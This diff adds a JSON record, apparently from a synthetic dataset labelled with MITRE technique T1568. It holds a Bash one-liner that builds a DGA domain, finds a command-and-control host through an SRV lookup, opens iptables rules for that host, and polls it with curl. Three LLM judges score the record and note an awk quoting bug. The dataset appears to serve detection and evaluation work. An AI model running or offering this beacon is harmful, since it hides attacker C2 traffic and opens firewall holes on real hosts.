@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'base=$(date -u +%Y%m%d | md5sum | cut -c1-10).net-sync.cc; srv=$(dig +short _c2._tcp.$base SRV | head -n1); target=$(awk \"{print $4}\" <<<\"$srv\"); port=$(awk \"{print $3}\" <<<\"$srv\"); ip=$(dig +short A \"$target\" | head -n1); if [ -n \"$ip\" ] && [ -n \"$port\" ]; then iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$target:$port/poll?node=$(hostname)\"; fi'",
+  "explanation": "Queries SRV records to dynamically discover the C2 host and port, resolves the target to IP, adds iptables rules for that IP:port, and polls the C2 path.",
+  "rationale_steps": [
+    "Construct base domain via DGA",
+    "Query SRV record for service endpoint and port",
+    "Resolve SRV target to an IP address",
+    "Allow traffic to the resolved IP:port via iptables",
+    "Poll C2 endpoint using the dynamically discovered port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-4b6829ad",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid separators, and recognizable flags/options throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While it conceptually performs DGA-like domain generation and SRV-based dynamic resolution consistent with T1568, the awk field extraction uses double quotes causing shell expansion of $3/$4 (likely yielding {print } and failing to parse port/target), and the iptables steps would require root privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:14:01.168504Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 3,
+        "syntactic_justification": "The overall bash structure is valid and mostly well-formed, but the `awk` here-string usage (`awk \"{print $4}\" <<<\"$srv\"`) uses double quotes inside double quotes without proper escaping, which would cause awk to receive an empty print statement rather than the intended field extraction, making those lines functionally broken.",
+        "semantic_score": 4,
+        "semantic_justification": "The command strongly aligns with T1568 dynamic resolution by generating a date-seeded MD5-based domain, querying SRV records to discover C2 host/port at runtime, resolving the target IP, dynamically inserting iptables rules, and polling the C2 endpoint \u2014 all canonical DGA/dynamic DNS C2 behaviors \u2014 though the awk quoting bug would prevent correct host/port extraction in practice, and iptables manipulation typically requires root privileges not acknowledged in the metadata.",
+        "combined_score": 3.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T00:17:47.364180Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command contains a significant quoting error: using double quotes around $4 and $3 inside the bash -c string causes the shell to expand them as empty positional parameters, leading to awk syntax errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the DGA-style domain generation and SRV record resolution perfectly align with T1568, the command requires root privileges for iptables (contradicting the 'None' privilege metadata) and the awk logic error prevents successful execution.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:17:58.023908Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
